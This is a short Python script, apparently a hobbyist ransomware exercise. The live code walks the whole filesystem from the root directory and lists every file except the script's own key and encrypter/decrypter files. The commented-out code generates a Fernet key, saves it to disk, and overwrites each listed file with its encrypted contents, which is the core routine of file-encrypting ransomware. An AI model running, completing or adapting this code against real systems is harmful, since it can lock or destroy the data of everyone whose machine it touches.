import os
from cryptography.fernet import Fernet



root_dir = "/"

def get_all_files(root_dir):
    all_files = []
    for dirpath, dirnames, filenames in os.walk(root_dir):
        for filename in filenames:
            full_path = os.path.join(dirpath, filename)
            if full_path.endswith(("decrypter.py", "encrypter.py", "TheKey.key")):
                continue
            all_files.append(full_path)
    return all_files

files = get_all_files(root_dir)
print(files)
#this goes through the current directory and puts the files on a list
# for file in os.listdir():
#     if file == "decrypter.py" or file == "encrypter.py" or file == ".git" or file =="TheKey.key":
#         continue
#     #without this directories will also be added, and we also want files.
#     if(os.path.isfile(file)):
#         files.append(file)
# print(files)


# key = Fernet.generate_key()
# #generate a key with fernet and store it in a file named "TheKey.key" AND ignore it in the previous for loop
# with open("TheKey.key", "wb") as thekey:
#     thekey.write(key)


# for file in files:
#     with open(file, "rb") as theFile:
#         contentOfFiles = theFile.read()
#     #Encrypt data
#     encryptedContent = Fernet(key).encrypt(contentOfFiles)

#     with open(file, "wb") as theFile:
#         theFile.write(encryptedContent)